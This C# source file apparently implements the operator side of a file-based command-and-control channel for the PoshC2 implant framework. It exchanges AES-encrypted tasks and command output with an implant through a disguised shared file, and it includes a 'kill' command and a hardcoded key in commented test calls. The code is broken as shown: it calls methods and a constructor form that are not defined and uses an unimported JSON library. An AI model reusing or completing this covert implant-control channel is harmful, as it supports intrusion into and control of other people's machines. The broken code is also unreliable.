using System;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Security.Principal;
using System.Threading;
using System.Runtime.Serialization;
using System.Security;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.Serialization.Formatters.Binary;
using System.Reflection;

namespace FComm
{
    public class RHDataGram
    {
        public string PacketType { get; set; }
        public string Input { get; set; }
        public string Output { get; set; }
        public bool Actioned { get; set; }
        public bool Retrieved { get; set; }

        public RHDataGram()
        {
            Actioned = false;
            Retrieved = false;
        }

        public RHDataGram(string[] objContents)
        {
            PacketType = objContents[0];
            Input = objContents[1];
            Output = objContents[2];
            Actioned = bool.Parse(objContents[3]);
            Retrieved = bool.Parse(objContents[4]);
        }

        public RHDataGram(string objContents)
        {
            char[] delim = { ',' };
            FromStringArray(objContents.Split(delim));
        }

        public override string ToString()
        {
            return string.Join(",", ToStringArray());
        }

        public string[] ToStringArray()
        {
            return new string[] { PacketType, Input, Output, Actioned.ToString(), Retrieved.ToString() };
        }

        public void FromStringArray(string[] objContents)
        {
            PacketType = objContents[0];
            Input = objContents[1];
            Output = objContents[2];
            Actioned = bool.Parse(objContents[3]);
            Retrieved = bool.Parse(objContents[4]);
        }
    }

    public class RHServer
    {
        //Client is the far end of this connection.
        private string FilePath;
        private string Key;
        public RHServer(string FilePath_In, string HostInfo, string key)
        {
            //initialise object.
            try
            {
                FilePath = FilePath_In;
                Key = key;
                string path = Path.GetDirectoryName(FilePath_In);
                string filename = Path.GetFileName(FilePath_In);
                Directory.CreateDirectory(path); //Create the full path if it doesn't exist.
                var f = File.Create(FilePath_In); //create the file if it doesn't exist. Probably worth putting more sanity checks here.
                f.Close();
                f.Dispose();
                //lets populate it with the info we need.
                RHDataGram InitialContent = new RHDataGram() { PacketType = "INIT", Input = "initial", Output = HostInfo, Actioned = true };
                SendData(InitialContent);
            }
            catch (SecurityException e)
            {
                Console.WriteLine(e.Message);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public void Tasking(string input)
        {
            RHDataGram Task = new RHDataGram() { PacketType = "TASK", Input = input, Output = "", Actioned = false };

        }

        public RHDataGram GetCurrentTasking()
        {
            //Just to make the methods seem sensible.
            return GetData();
        }
        public void UpdateTask(RHDataGram Task)
        {
            //Just to make the methods seem sensible.
            SendData(Task);
        }

        private void SafeFileWrite(string data)
        {
            //Guaranteed File Write.
            FileStream f = null;
            while (f == null)
            {
                try
                {
                    f = new FileStream(FilePath, FileMode.Create, FileAccess.Write);
                    StreamWriter sr = new StreamWriter(f);
                    sr.WriteLine(data);
                    sr.Close();
                    f.Close();
                    sr.Dispose();
                    f.Dispose();
                }
                catch (IOException)
                {
                    //TODO: Limit attempts, throw an exception to indicate access has been lost
                    Thread.Sleep(200); // small sleep to wait before we loop to try again. Need to have an "attempts" limit. but not yet.
                }
            }
        }
        private string SafeFileRead()
        {
            string StrTask = "";
            int counter = 0;
            FileStream f = null;
            while (f == null)
            {
                try
                {
                    f = new FileStream(FilePath, FileMode.Open, FileAccess.Read);
                    StreamReader sr = new StreamReader(f);
                    string line;
                    while ((line = sr.ReadLine()) != null)
                    {
                        if (counter > 1)
                        {
                            throw new Exception();
                        }
                        //This should only happen once. Should. SHOULD. shit. it wont. so above it'll throw an exception if it derps.
                        StrTask = (line);
                        counter++;
                    }
                    sr.Close();
                    f.Close();
                    sr.Dispose();
                    f.Dispose();
                }
                catch (IOException)
                {
                    //TODO: Limit attempts, throw an exception to indicate access has been lost
                    Thread.Sleep(500); // small sleep to wait before we loop to try again. Need to have an "attempts" limit. but not yet.
                }
            }
            return StrTask;
        }

        private void SendData(RHDataGram DataToSend)
        {
            //Turn object into a string.
            //encrypt it
            //write it.
            SafeFileWrite(Encrypt(Key, DataToSend.ToString()));
        }

        private RHDataGram GetData()
        {
            //Get the contents of the file.
            //Decrypt it
            //Create a DataGram.
            return new RHDataGram(Decrypt(Key, SafeFileRead()));
        }

        public void CleanUp()
        {
            //maybe utilise POSH SHRED here?
            File.Delete(FilePath);
        }
        private static string Decrypt(string key, string ciphertext)
        {
            var rawCipherText = Convert.FromBase64String(ciphertext);
            var IV = new Byte[16];
            Array.Copy(rawCipherText, IV, 16);
            try
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                //return decrypted;
                //return decrypted.Where(x => x > 0).ToArray();
                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
            }
            catch
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                //return decrypted;
                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
                //return decrypted.Where(x => x > 0).ToArray();
            }
            finally
            {
                Array.Clear(rawCipherText, 0, rawCipherText.Length);
                Array.Clear(IV, 0, 16);
            }

        }

        private static string Encrypt(string key, string un, bool comp = false, byte[] unByte = null)
        {
            byte[] byEnc;
            if (unByte != null)
                byEnc = unByte;
            else
                byEnc = Encoding.UTF8.GetBytes(un);

            if (comp)
                byEnc = GzipCompress(byEnc);

            try
            {
                var a = CreateEncryptionAlgorithm(key, null);
                var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
            catch
            {
                var a = CreateEncryptionAlgorithm(key, null, false);
                var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
        }

        private static SymmetricAlgorithm CreateEncryptionAlgorithm(string key, string IV, bool rij = true)
        {
            SymmetricAlgorithm algorithm;
            if (rij)
                algorithm = new RijndaelManaged();
            else
                algorithm = new AesCryptoServiceProvider();

            algorithm.Mode = CipherMode.CBC;
            algorithm.Padding = PaddingMode.Zeros;
            algorithm.BlockSize = 128;
            algorithm.KeySize = 256;

            if (null != IV)
                algorithm.IV = Convert.FromBase64String(IV);
            else
                algorithm.GenerateIV();

            if (null != key)
                algorithm.Key = Convert.FromBase64String(key);

            return algorithm;
        }

        private static byte[] GzipCompress(byte[] raw)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
                {
                    gzip.Write(raw, 0, raw.Length);
                }
                return memory.ToArray();
            }
        }

        private static byte[] CombineArrays(byte[] first, byte[] second)
        {
            byte[] ret = new byte[first.Length + second.Length];
            Buffer.BlockCopy(first, 0, ret, 0, first.Length);
            Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
            return ret;
        }
    }

    public class Class1
    {
        private static string FilePath;
        private static string Encryptionkey = "";
        private static bool Running = false;
        private static bool Initialised = false;
        private static RHServer FComm;
        private static readonly object _lock = new object();

        public static void Main(string[] args)
        {
            Console.WriteLine(String.Join(",", args));
            Start(args);
            //Start(new string[] { "Start", "c:\\users\\public\\test.ost", "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=" });
            /*
            Start(new string[] { "Start", "ATHOMPSON", "msukpipereader", "mtkn4", "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=" });
            Console.ReadLine();
            */
            //Start(new string[] { "foo" });
            /*Console.ReadLine();
            Start(new string[] { "foo" });
            Console.ReadLine();
            Start(new string[] { "foo" });
            Console.ReadLine();
            Start(new string[] { "foo" });
            Console.ReadLine();
            */
        }

        /// <summary>
        /// Just a function that main can wrap for testing. 
        /// </summary>
        public static void Start(string[] args)
        {


            if (args.Length == 3 && args[0].ToLower() == "start") // If in format 'Start <filepath> <key>'
            {
                FilePath = args[1];
                Encryptionkey = args[2];
                Console.WriteLine($"[+] Connecting to: {FilePath} with key {Encryptionkey}");
                FComm = new RHServer(FilePath); //create an object.
                Running = true;
                Init(FComm);
                if (Initialised == true)
                {
                    Running = false;
                }
                
            }
            else if (Initialised == true)
            {
                Running = true;
                var command = $"{string.Join(" ", args)}";
                if (command.ToLower().StartsWith("kill"))
                {
                    IssueCommand(command, FComm, Running);
                    Running = false;
                    //assume the kill command works - maybe need to remove the implant from poshc2?
                }
                else
                {
                    IssueCommand(command, FComm, Running);
                }
            }

        }

        /// <summary>
        /// Will issue the specified command to the pipe and read the response
        /// </summary>
        public static void Init(RHServer FComm)
        {
            lock (_lock)
            {
                try
                {
                    string DataToParseJson = Decrypt(Encryptionkey, FComm.Receive());
                    Console.WriteLine("Bytes: " + DataToParseJson.Length);
                    //Step 1: STREAM
                    //MemoryStream stream = new MemoryStream(DataToParseBytes);
                    //BinaryFormatter bf = new BinaryFormatter();
                    //Fix the assembly name.
                    //bf.Binder = new PreMergeToMergedDeserializationBinder();
                    //Step 2: DESERIALIZE!
                    List<RHDataGram> DataToParse = JsonConvert.DeserializeObject<List<RHDataGram>>(DataToParseJson);
                    //Console.WriteLine(DataToParse.ToString());
                    //stream.Dispose();
                    foreach (RHDataGram Task in DataToParse)
                    {
                        if (Task.PacketType == "INIT") // it's the initialisation data. I should do something with this during the connect phase.
                        {
                            Console.WriteLine("Init Received or something");
                            Console.WriteLine(Task.Output);
                            Task.Retrieved = true;
                            Initialised = true;
                            continue;
                        }
                    }
                    //MemoryStream stream2 = new MemoryStream();
                    //bf.Serialize(stream2, DataToParse);
                    string jss = JsonConvert.SerializeObject(DataToParse);
                    var DataToGo = Encrypt(Encryptionkey, jss); //list is encrypted.
                    //stream2.Dispose();
                    //Send the DATAAAAAAAAAHH!!!
                    FComm.SendData(DataToGo);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Error in FComm Initialisation!!: {e.Message}");
                    Console.WriteLine($"[-] {e.StackTrace}");
                }
            }
        }
        public static void IssueCommand(string command, RHServer FComm, bool Running)
        {
            // Lock this so only one thread can read/write to the pipe at a time
            lock (_lock)
            {
                while (Running)
                {
                    Thread.Sleep(5000);
                    bool taskAdded = false;
                    try
                    {
                        //Get file contents
                        //decrypt the contents

                        string DataToParseJson = Decrypt(Encryptionkey, FComm.Receive());
                        //Step 1: STREAM
                        //MemoryStream stream = new MemoryStream(DataToParseJson);
                        //BinaryFormatter bf = new BinaryFormatter();
                        //bf.Binder = new PreMergeToMergedDeserializationBinder();
                        //Step 2: DESERIALIZE!
                        List<RHDataGram> DataToParse = JsonConvert.DeserializeObject<List<RHDataGram>>(DataToParseJson);
                        //stream.Dispose();

                        foreach (RHDataGram Task in DataToParse)
                        {
                            if (Task.Actioned == true && Task.PacketType != "INIT" && Task.Retrieved == false) //It's output from a command!.
                            {
                                Console.WriteLine(Task.Output);
                                Task.Retrieved = true;
                                Running = false; //This only works because we're only working with single tasks right now. Proper Ghetto.
                            }
                            if (taskAdded == false) // Shonky Ghetto Code just so we don't add endless copies of the same command.
                            {
                                DataToParse.Add(FComm.SetTask(command));
                                taskAdded = true;
                            }

                        }
                        //MemoryStream stream2 = new MemoryStream();
                        //bf.Serialize(stream, DataToParse);
                        string jss2 = JsonConvert.SerializeObject(DataToParse);
                        var DataToGo = Encrypt(Encryptionkey,jss2); //list is encrypted.
                        //stream.Dispose();
                        //Send the DATAAAAAAAAAHH!!!
                        FComm.SendData(DataToGo);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Error in FComm Command Loop: {e.Message}");
                        Console.WriteLine($"[-] {e.StackTrace}");
                    }
                }
            }
        }

        private static string Decrypt(string key, string ciphertext)
        {
            var rawCipherText = Convert.FromBase64String(ciphertext);
            var IV = new Byte[16];
            Array.Copy(rawCipherText, IV, 16);
            try
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
            }
            catch
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
            }
            finally
            {
                Array.Clear(rawCipherText, 0, rawCipherText.Length);
                Array.Clear(IV, 0, 16);
            }
        }

        private static string Encrypt(string key, string un, bool comp = false, byte[] unByte = null)
        {
            byte[] byEnc;
            if (unByte != null)
                byEnc = unByte;
            else
                byEnc = Encoding.UTF8.GetBytes(un);

            if (comp)
                byEnc = GzipCompress(byEnc);

            try
            {
                var a = CreateEncryptionAlgorithm(key, null);
                var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
            catch
            {
                var a = CreateEncryptionAlgorithm(key, null, false);
                var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
        }

        private static SymmetricAlgorithm CreateEncryptionAlgorithm(string key, string IV, bool rij = true)
        {
            SymmetricAlgorithm algorithm;
            if (rij)
                algorithm = new RijndaelManaged();
            else
                algorithm = new AesCryptoServiceProvider();

            algorithm.Mode = CipherMode.CBC;
            algorithm.Padding = PaddingMode.Zeros;
            algorithm.BlockSize = 128;
            algorithm.KeySize = 256;

            if (null != IV)
                algorithm.IV = Convert.FromBase64String(IV);
            else
                algorithm.GenerateIV();

            if (null != key)
                algorithm.Key = Convert.FromBase64String(key);

            return algorithm;
        }

        private static byte[] GzipCompress(byte[] raw)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
                {
                    gzip.Write(raw, 0, raw.Length);
                }
                return memory.ToArray();
            }
        }

        private static byte[] CombineArrays(byte[] first, byte[] second)
        {
            byte[] ret = new byte[first.Length + second.Length];
            Buffer.BlockCopy(first, 0, ret, 0, first.Length);
            Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
            return ret;
        }



    }
}

